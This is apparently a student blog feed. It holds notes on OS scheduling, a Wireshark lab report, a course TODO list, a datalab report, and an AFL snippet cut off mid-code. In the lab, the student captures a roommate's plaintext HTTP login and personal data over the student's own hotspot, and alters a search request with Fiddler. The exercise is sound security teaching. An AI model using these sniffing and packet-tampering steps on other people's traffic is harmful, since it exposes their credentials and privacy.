到达时，调度程序当然可以做其他事情：它可以抢占（preempt）工作 A，并 决定运行另一个工作，或许稍后继续工作 A。根据我们的定义，SJF 是一种非抢占式 （non-preemptive）调度程序</p><p>向 SJF 添加抢占，称为<strong>最短完成时间优先（Shortest Time-to-Completion First，STCF）</strong>或<strong>抢占式最短作业优先（Preemptive Shortest Job First ，PSJF）</strong>调度程序</p><h3 id="新度量指标：响应时间"><a href="#新度量指标：响应时间" class="headerlink" title="新度量指标：响应时间"></a>新度量指标：响应时间</h3><p><strong>T 响应时间= T 首次运行−T 到达时间</strong></p><p>例如，如果 3 个工作同时到 达，第三个工作必须等待前两个工作全部运行后才能运行。这种方法虽然有很好的周转时 间，但对于响应时间和交互性是相当糟糕的。假设你在终端前输入，不得不等待 10s 才能看 到系统的回应，只是因为其他一些工作已经在你之前被调度：你肯定不太开心。</p><h3 id="轮转"><a href="#轮转" class="headerlink" title="轮转"></a>轮转</h3><p>RR 在一个<strong>时间片（time slice，有时称为调度量子，scheduling quantum）</strong>内运行一个工作，然后切换到运行队列中的下一个任务，而不是运行一个任务直 到结束。它反复执行，直到所有任务完成。</p><p><strong>时间片长度必须是时钟中断周期的倍数</strong></p><p>时间片太短是有问题的：突然上下文切换的成本将影响整体性能。因此，系统设计者 需要权衡时间片的长度，使其足够长，以便<strong>摊销（amortize）</strong>上下文切换成本，而又不会使 系统不及时响应。</p><p><strong>如果周转时间是我们的指标，那么 RR 确实是最糟糕的策略之一</strong></p><p>RR会趋向于每个进程都要耗费数倍的时间完成。</p><p>我们开发了两种调度程序。第一种类型（SJF、STCF）<strong>优化周转时间，但对响应时间不利。</strong>第二种类型（RR）<strong>优化响应时间，但对周转时间不利</strong>。</p><p>不能  <strong>“既要。。。又要。。。”</strong></p><h3 id="结合I-O"><a href="#结合I-O" class="headerlink" title="结合I/O"></a>结合I/O</h3><p>一种常见的方法是将 A 的每个 10ms 的子工作视为一项独立的工作。因此，当系统启动 时，它的选择是调度 10ms 的 A，还是 50ms 的 B。对于 STCF，选择是明确的：选择较短的 一个，在这种情况下是 A。然后，A 的工作已完成，只剩下 B，并开始运行。然后提交 A 的一个新子工作，它抢占 B 并运行 10ms。这样做可以实现重叠（overlap），一个进程在等 待另一个进程的 I/O 完成时使用 CPU，系统因此得到更好的利用</p><p><img src="/2023/03/23/Operating-Systems/p6.png"></p><h1 id="第八章-调度：多级反馈队列"><a href="#第八章-调度：多级反馈队列" class="headerlink" title="第八章 调度：多级反馈队列"></a>第八章 调度：多级反馈队列</h1><h2 id="MLFQ：基本规则"><a href="#MLFQ：基本规则" class="headerlink" title="MLFQ：基本规则"></a>MLFQ：基本规则</h2><p>例如，如果一个工作不断放弃 CPU 去等待键盘输入，这是交互型进程的可能行为，MLFQ 因此会让它保持高优先级。相 反，如果一个工作长时间地占用 CPU，MLFQ 会降低其优先级。通过这种方式，MLFQ 在 进程运行过程中学习其行为，从而利用工作的历史来预测它未来的行为。</p><p>至此，我们得到了 MLFQ 的两条基本规则。</p><p> 规则 1：如果 A 的优先级 &gt; B 的优先级，运行 A（不运行 B）。 </p><p>规则 2：如果 A 的优先级 = B 的优先级，轮转运行 A 和 B。</p><h2 id="改变优先级"><a href="#改变优先级" class="headerlink" title="改变优先级"></a>改变优先级</h2><p>我们必须决定，在一个工作的生命周期中，MLFQ 如何改变其优先级（在哪个队列中）。 要做到这一点，我们必须记得工作负载：既有运行时间很短、频繁放弃 CPU 的交互型工作， 也有需要很多 CPU 时间、响应时间却不重要的长时间计算密集型工作。下面是我们第一次 尝试优先级调整算法。</p><p>规则 3：工作进入系统时，放在最高优先级（最上层队列）。 </p><p>规则 4a：工作用完整个时间片后，降低其优先级（移入下一个队列）。 </p><p>规则 4b：如果工作在其时间片以内主动释放 CPU， 则优先级不变。</p><p>如果不知道工作是短工 作还是长工作，那么就在开始的时候假设其是短工作，并赋予最高优先级。如果确实是短 工作，则很快会执行完毕，否则将被慢慢移入低优先级队列，而这时该工作也被认为是长 工作了。通过这种方式，MLFQ 近似于 SJF。</p><p><strong>有I/O</strong>：</p><p>如果进程在时间片用完之前主动放弃 CPU， 则保持它的优先级不变。这条规则的意图很简单：假设交互型工作中有大量的 I/O 操作（比 如等待用户的键盘或鼠标输入），它会在时间片用完之前放弃 CPU。在这种情况下，我们不 想处罚它，只是保持它的优先级不变。</p><p><img src="/2023/03/23/Operating-Systems/p7.png"></p><p>关于MLFQ的问题：</p><p>首先，会有饥饿（starvation）问题。如果系统有“太多”交互型工作，就会不断占用 CPU，导致长工作永远无法得到 CPU（它们饿死了）。即使在这种情况下，我们希望这些长 工作也能有所进展。</p><p>其次，聪明的用户会重写程序，愚弄调度程序（game the scheduler）。愚弄调度程序指 的是用一些卑鄙的手段欺骗调度程序，让它给你远超公平的资源。上述算法对如下的攻击 束手无策：进程在时间片用完之前，调用一个 I/O 操作（比如访问一个无关的文件），从而 主动释放 CPU。如此便可以保持在高优先级，占用更多的 CPU 时间。做得好时（比如，每 运行 99%的时间片时间就主动放弃一次 CPU），工作可以几乎独占 CPU。</p><h2 id="尝试提高优先级"><a href="#尝试提高优先级" class="headerlink" title="尝试提高优先级"></a>尝试提高优先级</h2><p><strong>规则 5：</strong>经过一段时间 S，就将系统中所有工作重新加入最高优先级队列。</p><h2 id="尝试更好的计时方法"><a href="#尝试更好的计时方法" class="headerlink" title="尝试更好的计时方法"></a>尝试更好的计时方法</h2><p>这里的解决方案，是为 MLFQ 的每层队列提供更完善的 CPU 计时方式（accounting）。 调度程序应该记录一个进程在某一层中消耗的总时间，而不是在调度时重新计时。只要进 程用完了自己的配额，就将它降到低一优先级的队列中去。不论它是一次用完的，还是拆 成很多次用完。因此，我们重写规则 4a 和 4b。</p><p><strong>规则 4</strong>：一旦工作用完了其在某一层中的时间配额（无论中间主动放弃了多少次 CPU），就降低其优先级（移入低一级队列）。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">//小结：<br> 规则 <span class="hljs-number">1</span>：如果 <span class="hljs-keyword">A</span> 的优先级 &gt; B 的优先级，运行 <span class="hljs-keyword">A</span>（不运行 B）。<br> 规则 <span class="hljs-number">2</span>：如果 <span class="hljs-keyword">A</span> 的优先级 = B 的优先级，轮转运行 <span class="hljs-keyword">A</span> 和 B。<br> 规则 <span class="hljs-number">3</span>：工作进入系统时，放在最高优先级（最上层队列）。<br> 规则 <span class="hljs-number">4</span>：一旦工作用完了其在某一层中的时间配额（无论中间主动放弃了多少次<br>        CPU），就降低其优先级（移入低一级队列）。<br> 规则 <span class="hljs-number">5</span>：经过一段时间 S，就将系统中所有工作重新加入最高优先级队列。<br></code></pre></td></tr></table></figure><h1 id="第九章-调度：比例份额"><a href="#第九章-调度：比例份额" class="headerlink" title="第九章 调度：比例份额"></a>第九章 调度：比例份额</h1><p>在本章中，我们来看一个不同类型的调度程序——比例份额（proportional-share）调度 程序，有时也称为公平份额（fair-share）调度程序。比例份额算法基于一个简单的想法：调 度程序的最终目标，是确保每个工作获得一定比例的 CPU 时间，而不是优化周转时间和响 应时间。</p><h2 id="基本概念：彩票数表示份额"><a href="#基本概念：彩票数表示份额" class="headerlink" title="基本概念：彩票数表示份额"></a>基本概念：彩票数表示份额</h2><p>下面来看一个例子。假设有两个进程 A 和 B，A 拥有 75 张彩票，B 拥有 25 张。因此 我们希望 A 占用 75%的 CPU 时间，而 B 占用 25%。</p><p>通过不断定时地（比如，每个时间片）抽取彩票，彩票调度从概率上（但不是确定的） 获得这种份额比例。抽取彩票的过程很简单：调度程序知道总共的彩票数（在我们的例子 中，有 100 张）。调度程序抽取中奖彩票，这是从 0 和 99①之间的一个数，拥有这个数对应 的彩票的进程中奖。假设进程 A 拥有 0 到 74 共 75 张彩票，进程 B 拥有 75 到 99 的 25 张， 中奖的彩票就决定了运行 A 或 B。调度程序然后加载中奖进程的状态，并运行它。</p><h1 id="第11章-关于-CPU-虚拟化的总结"><a href="#第11章-关于-CPU-虚拟化的总结" class="headerlink" title="第11章 关于 CPU 虚拟化的总结"></a>第11章 关于 CPU 虚拟化的总结</h1><h1 id="第12章-关于内存虚拟化的对话"><a href="#第12章-关于内存虚拟化的对话" class="headerlink" title="第12章 关于内存虚拟化的对话"></a>第12章 关于内存虚拟化的对话</h1><h1 id="第14章-插叙：内存操作-API"><a href="#第14章-插叙：内存操作-API" class="headerlink" title="第14章 插叙：内存操作 API"></a>第14章 插叙：内存操作 API</h1><h1 id="第-15-章-机制：地址转换"><a href="#第-15-章-机制：地址转换" class="headerlink" title="第 15 章 机制：地址转换"></a>第 15 章 机制：地址转换</h1>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验一</title>
    <link href="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <url>/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="计网实验一Wireshark抓包、改包等"><a href="#计网实验一Wireshark抓包、改包等" class="headerlink" title="计网实验一Wireshark抓包、改包等"></a>计网实验一Wireshark抓包、改包等</h1><h2 id="实验内容一："><a href="#实验内容一：" class="headerlink" title="实验内容一："></a>实验内容一：</h2><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>使用wireshark在教学楼，咖啡店（或其他提供顾客Wi-Fi的营业性公共场所），寝室三类地点静默观察能听到的数据包，观察wireshark对它的分层解析，尽可能多的描述你看到了什么，以及这三类地方数据包的不同。如果只给你一段wireshark的数据包记录，例如pcap文件，你能区分它是从哪里采集的吗？可行性如何，难点主要在哪里。</p><h3 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h3><p>1.在教学楼、咖啡店、寝室静默观察数据包</p><p>1.1 教学楼观察到的数据包</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p1.png"></p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p2.png"></p><p>可以看到，绝大多数为 ARP 协议的数据包，其余少量的数据包分别是 NBNS , MDNS , DHCP 等数据包。<br>ARP数据包：ARP（Address Resolution Protocol）地址解析协议，根据IP地址获取物理地址的一个TCP/IP协议。</p><p>由于OSI模型把网络分为七层，IP地址在OSI模型第三层，MAC地址在第二层，彼此不直接通信。在通过以太网发送IP数据包时，需要封装第三层（32位IP地址）和第二层（48位MAC地址）的报头，由于发送数据包时，只知道目标IP地址，不知道其MAC地址，而又不能跨越第二、三层，所有需要使用地址解析协议。</p><p>ARP 的报文格式：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p3.png"></p><ul><li><p>字段1：ARP请求的目的以太网地址，全1时，代表广播地址。</p></li><li><p>字段2：发送ARP请求的以太网地址。</p></li><li><p>字段3：以太网帧类型表示后面的数据类型，ARP请求和ARP应答此字段为：0x0806。</p></li><li><p>字段4：硬件地址类型，硬件地址不止以太网一种，是以太网类型时，值为1。</p></li><li><p>字段5：表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800。</p></li><li><p>字段6和7：表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节。</p></li><li><p>字段8：是操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答；值为3，表示进行RARP请求；值为4，表示进行RARP应答。</p></li><li><p>字段9：是发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。</p></li><li><p>字段10：是发送ARP请求或应答的IP地址。</p></li><li><p>字段11和12：是目的端的硬件地址和IP地址。</p></li></ul><p>对抓到的 ARP 数据包进行分析：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p4.png"><br>Frame 9: 56 bytes on wire </p><p>指的是这是第9帧数据包的详细信息，这个包大小为56字节。</p><p>Ethernet II , Src : Tp-LinkT_a1:f4:64 , Dst : Broadcast</p><p>以上内容表示以太网帧头部信息，源地址是Src后的内容，目的地址是全1，即为广播，因为主机PC2不知道PC1主机的MAC地址，这样，局域网内所有设备都会收到该数据包。</p><p>Address Resolution Protocol(request)</p><p>以上内容表示地址解析协议的内容，request 表示该包是一个请求包。在该包中，包含有ARP更详细的字段信息，如下所示：</p><ul><li><p>Address Resolution Protocol (request)   #ARP请求包 </p></li><li><p>Hardware type: Ethernet (1)   #硬件类型 </p></li><li><p>Protocol type: IP (0x0800)   #协议类型 </p></li><li><p>Hardware size: 6   #硬件地址 </p></li><li><p>Protocol size: 4  #协议长度 </p></li><li><p>Opcode: request (1)   #操作码。该值为1表示是个ARP请求包 </p></li><li><p>Sender MAC address: 02:00:04:78:01:7b (02:00:04:78:01:7b)   #发送端MAC地址 </p></li><li><p>Sender IP address: 10.1.1.142 (10.1.1.142)   #发送端IP地址 </p></li><li><p>Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)   #目标MAC地址 </p></li><li><p>Target IP address: 10.1.1.166(10.1.1.166)   #目标IP地址 </p></li></ul><p>纵观所有抓到的包，其最大不同在于source的不同，有的是HuaweiTe_09:e8:48，有的是Tp-LinkT_13:68:28等等，这些不同的源应该是不同的同学的host。由于广播的原因，我可以捕获这些包。</p><p>1.2寝室观察到的数据包</p><p>由于教室、寝室，均连接校园网，预测结果基本一致</p><p>抓包结果：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p5.png"></p><p>观察其内容可知，寝室内校园网抓包结果与教室内一致。</p><p>1.3咖啡厅观察到的数据包</p><p>首先，确认我的IP地址</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p6.png"></p><p>收听一段时间后，如图：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p7.png"></p><p>其中有一段TCP握手过程：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p8.png"></p><p>查询该ip地址，35.244.128.0 发现是与谷歌云进行链接。</p><p>找到其他握手过程，分别查询ip<br>分别为：网易云，某香港ip，亚马逊云，等等。</p><p>再观察其HTTP协议包：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p9.png"><br>追踪之：<br><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p10.png"><br>可以发现这是一个图片的发送。</p><p>2.这三种数据的不同：</p><p>很显然，咖啡馆的数据包与另外两个相比，信息量更大，有很多TCP协议的握手等过程，以及一部分HTTP协议传输的数据。而链接校园网的寝室与教室，基本上只能接收到一些ARP包，没什么用处。</p><p>3.分辨pcap文件来源</p><p>目前，分辨有内网隔离的校园网来源的pcap与公开wifi的咖啡厅来源的pcap是比较容易的<br>但其他情况，就不能轻易下结论了。</p><h2 id="实验内容二："><a href="#实验内容二：" class="headerlink" title="实验内容二："></a>实验内容二：</h2><h3 id="实验要求：-1"><a href="#实验要求：-1" class="headerlink" title="实验要求："></a>实验要求：</h3><p>打开你的手机热点，不设置密码，用wireshark观察舍友通过你的手机上HTTP网站，登录学校门户，打开淘宝购物等过程，描述你能看到什么，不能看到什么。讲讲你作为信息安全专业人士，想到了什么？如果这台手机可以被你操控，比如对舍友的信息流注入点什么，那么你又能想到些什么呢？</p><h3 id="实验内容：-1"><a href="#实验内容：-1" class="headerlink" title="实验内容："></a>实验内容：</h3><p>开启热点进行抓包后，有一个HTTP包引起了注意：<br><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p11.png"></p><p>可以看到，从这个包内，我能轻松地找到登录时传入的用户名以及经过某种算法计算后的密码值。</p><p>由于HTTP明文传输，我也可以从对校内个人门户的访问过程中读到相关个人信息如下：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p12.jpg" alt="&quot;名字被暴露了&quot;"></p><p>以及学院、学号等信息</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p13.jpg"></p><p>还有我访问的页面–校园网流量使用情况中的数据：已使用 88.11G均可见</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p14.png"></p><p>可以看出，如果HTTP使用者不做任何加密措施（非协议层次的），通过HTTP协议传输的所有信息，都将完全可见可读，毫无隐私可言，对于敏感信息，更是危及信息安全。</p><p>如果我能操纵这个手机</p><p>可以进行改包，用fiddler软件进行包拦截，再将其中的数据修改，最后发送出去。</p><p>例如：</p><p>我搜索马云：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p15.png"></p><p>利用fiddler 拦截、改包为马化腾后</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p16.png"></p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p17.png"></p><p>发现我的搜索变成了马化腾。</p><p>当我能控制这个手机时同理，可以操纵相当一部分的数据流。（需要配置好一些参数，例如主机、端口号8888等，故真实场景内，利用其窃听较为容易，控制很难！）</p><p><strong>以上就是本次实验的全部内容</strong></p><h2 id="总结与心得"><a href="#总结与心得" class="headerlink" title="总结与心得"></a>总结与心得</h2><ul><li>通过这次实验，学会了用 wireshark 进行抓包分析，了解了 ARP HTTP TCP 等协议的执行流程，以及其包的结构。</li><li>通过查阅资料，学会了通过 QQ 电话来查询好友的 IP （无需接通，具体实现请移步个人博客 kawatsuki.com ），以及抓包、拦截、改包等一系列操作，深刻感受到，计算机网络我是可以参与的，过程性参与的。</li><li>最后，我认为信息安全事业任重道远，网络上很多数据都是透明的，通过 WIFI 抓包等手段，可以很容易地获取之，我们都是透明地无隐私地生活在这个网络社会上！</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TODO</title>
    <link href="/2023/03/21/TODO/"/>
    <url>/2023/03/21/TODO/</url>
    
    <content type="html"><![CDATA[<h1 id="TODO：（23-4-17-Mon-Week-10）"><a href="#TODO：（23-4-17-Mon-Week-10）" class="headerlink" title="TODO：（23.4.17 Mon Week 10）"></a>TODO：（23.4.17 Mon Week 10）</h1><p>联系方式</p><p>email：<a href="mailto:&#x6b;&#x61;&#119;&#x61;&#x30;&#50;&#55;&#x73;&#117;&#x6b;&#x69;&#x40;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#x6b;&#x61;&#119;&#x61;&#x30;&#50;&#55;&#x73;&#117;&#x6b;&#x69;&#x40;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;</a>  /  <a href="mailto:&#x66;&#99;&#x32;&#x73;&#116;&#x75;&#x64;&#x79;&#64;&#x68;&#x6e;&#x75;&#x2e;&#101;&#x64;&#x75;&#x2e;&#x63;&#110;">&#x66;&#99;&#x32;&#x73;&#116;&#x75;&#x64;&#x79;&#64;&#x68;&#x6e;&#x75;&#x2e;&#101;&#x64;&#x75;&#x2e;&#x63;&#110;</a></p><h2 id="vul337"><a href="#vul337" class="headerlink" title="vul337"></a>vul337</h2><ul><li><p>大组会：周四晚 6：30；</p></li><li><p>小组会 xfuzz ：周四中午 13：00 ~ 14：00；</p></li><li><p>跟进 xfuzz 项目；</p></li><li><p>每周日晚上/周一早上汇报周报</p></li><li><p>forkserver persistent mode 整合 （目前重心放在这里！4.17）</p><ul><li><del>将 xfuzz 部署，运行</del>（done）</li><li>多查看源 AFL 及 ++ 代码，将目标部分搬运入项目<h2 id="course"><a href="#course" class="headerlink" title="course"></a>course</h2></li></ul></li><li><p>计网 </p><ul><li>进度：第三章开始；（3.19）</li><li>小班课，读15篇人工智能-计网相关论文，完成一个总结，人均2-3分钟。</li></ul></li><li><p>计算机系统</p><ul><li>小班 ： 双数周，周四早八；</li><li>CSAPP ：<del>第三章</del>；done（3.15）</li><li>实验三：<del>bomb lab</del></li></ul></li><li><p>操作系统</p><ul><li>实验，每周一下午验收</li></ul></li><li><p>创业</p><ul><li>慕课需要水；</li></ul></li><li><p>毛概实践</p><ul><li>读后感；</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datalab</title>
    <link href="/2023/03/21/datalab/"/>
    <url>/2023/03/21/datalab/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统实验二-Datalab-实验报告"><a href="#计算机系统实验二-Datalab-实验报告" class="headerlink" title="计算机系统实验二 Datalab 实验报告"></a>计算机系统实验二 Datalab 实验报告</h1><h1 id="1-实验目的："><a href="#1-实验目的：" class="headerlink" title="1.实验目的："></a>1.实验目的：</h1><ul><li>补充完整 bits.c 文件内容，完成实验；</li><li>了解机器中对整型、浮点数的存储方式；</li><li>熟悉位操作，完成一系列指令。</li></ul><h1 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2.实验准备"></a>2.实验准备</h1><ul><li>学习 CSAPP 书上的相关信息表示部分；</li><li>配置好虚拟机环境。</li></ul><h1 id="3-实验任务"><a href="#3-实验任务" class="headerlink" title="3.实验任务"></a>3.实验任务</h1><ul><li>补充完整 bits.c 文件内容，并利用 btest 程序进行测试。</li></ul><p>1.bitAnd </p><p>要求： 输出两个数按位与操作后的值。<br>实现：参数 x，y 分别按位取反后，进行或操作，最后再将结果取反即可（数学推导而成）</p><p>代码截图：<br><img src="/2023/03/21/datalab/p1.png"></p><p>2.getByte</p><p>要求：将整型数据 x 的第 n 个字节取出。<br>实现：直接将 x 右移 n*8 个位后，与 0xFF 进行与操作，取出最后一个字节即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p2.png"></p><p>3.logicalShift</p><p>要求：实现逻辑右移，由于 &gt;&gt; 为算术右移，需要实现负数的逻辑右移。<br>实现：将 x 算术右移 n 位后，与 <code>~(1 &lt;&lt; 31) &gt;&gt; n) &lt;&lt; 1)</code>进行与操作，这样可以使负数算术右移后，前面的一串 1 改为 0 ，达到逻辑右移的目的。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p3.png"></p><p>4.bitCount</p><p>要求：计算出x中有多少个1。<br>实现：计算出每两位中1的个数，用对应的两位进行存储，随后计算每四位中，再计算每8位，最后可得到结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p4.png"></p><p>5.bang</p><p>要求：不使用逻辑取反的情况下实现逻辑取反。<br>实现：用x或其负数，再右移31位取符号位+1即可。利用了x取反后，符号位均为1，除x == 0外的特性。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p5.png"></p><p>6.tmin</p><p>要求：输出最小的二进制补码。<br>实现：最小的二进制补码是0x80000000。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p6.png"></p><p>7.fitsBits</p><p>要求：给出一个数，判断x 是否能最少被 n 位表示。<br>实现：对于正数，若 x 右移 n -1 位（这一个是符号位，不可缺少），剩余的都是0，即可，对于负数，剩余的应该都是1。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p7.png"></p><p>8.divpwr2</p><p>要求：输出x除以2的n次幂后，向0取整的结果。<br>实现：正数直接右移n位即可，负数需进行调整。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p8.png"></p><p>9.negate</p><p>要求：实现取反。<br>实现：直接按位取反+1（取补码）即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p9.png"></p><p>10.isPositive</p><p>要求：判断 x 是否大于0；<br>实现：对 x == 0 单独讨论即可</p><p>代码截图：<br><img src="/2023/03/21/datalab/p10.png"></p><p>11.isLessOrEqual</p><p>要求：判断x是否小于等于y<br>实现：用y-x，判断符号位即可。</p><p>代码截图:<br><img src="/2023/03/21/datalab/p11.png"></p><p>12.ilog2</p><p>要求：求xlog2的值<br>实现：在这个实现中，我们首先将结果初始化为0。然后，我们使用位运算符逐步将结果设置为x的二进制表示中最高位1的位置。具体来说，我们首先检查x的高16位是否有1，如果有，则将结果的高4位设置为4。然后，我们将x右移结果的值，以便在下一步中检查剩余的位。我们重复这个过程，直到我们检查了x的所有位。最后，我们返回结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p12.png"></p><p>13.float_neg</p><p>要求：浮点数取反<br>实现：先将NaN直接返回无需操作，其余数据修改符号位即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p13.png"></p><p>14.float_i2f</p><p>要求：将int转换为float<br>实现：首先使用0x80000000获取x的符号位，如果x的符号位上是1，则求其补码。这一过程通过if判断实现。之后，通过while循环寻找除符号位外最高位1的位置，由于0x0和0x80000000去除符号位后对循环跳出条件有影响（会陷入死循环），故作为特殊边界值取出，单独做返回值。找到最高位1的位置后加上偏置量即可得到阶码的数值，再通过移位操作即可转移到指定的地方。对x进行左移操作，使32位中仅保留尾数相关的信息。取前23位作为尾数基础部分，后9位作为判断舍入的依据。若后9位不处于中间值则按照“大于进位，小于保留原状态”的方式处理。若处于中间值，则看23位的最后一位，如果它是1则选择“进位+1”，如果它是0则选择“保持原状态”。最后，整合各部分结果即可得到题目要求的结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p14.png"></p><p>15.float_twice</p><p>要求：浮点数乘二<br>实现：对于非规格化值，需要将尾数左移一位，若进位，阶码需+1。对于规格化值，阶码+1。特殊值直接返回本身就行。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p15.png"></p><h2 id="检查是否违规："><a href="#检查是否违规：" class="headerlink" title="检查是否违规："></a>检查是否违规：</h2><p>dlc检查：<br><img src="/2023/03/21/datalab/p16.png"></p><p>btest检查：<br><img src="/2023/03/21/datalab/p17.png"></p><p>关于btest有一个项目没过关：是环境问题，0肯定可以用32位表示的。</p><h1 id="4-实验总结："><a href="#4-实验总结：" class="headerlink" title="4.实验总结："></a>4.实验总结：</h1><h2 id="实验中出现的问题："><a href="#实验中出现的问题：" class="headerlink" title="实验中出现的问题："></a>实验中出现的问题：</h2><ul><li>环境的差异性，导致有一个样例未能通过，但代码是没问题的。</li><li>虚拟机的不稳定性，虚拟机总是死机。</li></ul><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><ul><li>操作位是一个十分有意思的事情，利用有限的操作达成一个目的。</li><li>体会到更底层方面，仅用加法、位移这类操作实现计算机的艰难与智慧。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xfuzz</title>
    <link href="/2023/03/19/xfuzz/"/>
    <url>/2023/03/19/xfuzz/</url>
    
    <content type="html"><![CDATA[<p>cc_params传参调用execv</p><figure class="highlight sqf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs sqf">cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-D__AFL_LOOP(_A)=&quot;</span><br>    <span class="hljs-string">&quot;(&#123; static volatile char *_B __attribute__((used)); &quot;</span><br>    <span class="hljs-string">&quot; _B = (char*)\&quot;&quot; PERSIST_SIG &quot;</span>\<span class="hljs-string">&quot;; &quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>    <span class="hljs-string">&quot;__attribute__((visibility(\&quot;</span><span class="hljs-keyword">default</span>\<span class="hljs-string">&quot;))) &quot;</span><br>    <span class="hljs-string">&quot;int _L(unsigned int) __asm__(\&quot;</span><span class="hljs-variable">___afl_persistent_loop</span>\<span class="hljs-string">&quot;); &quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-string">&quot;__attribute__((visibility(\&quot;</span><span class="hljs-keyword">default</span>\<span class="hljs-string">&quot;))) &quot;</span><br>    <span class="hljs-string">&quot;int _L(unsigned int) __asm__(\&quot;</span><span class="hljs-variable">__afl_persistent_loop</span>\<span class="hljs-string">&quot;); 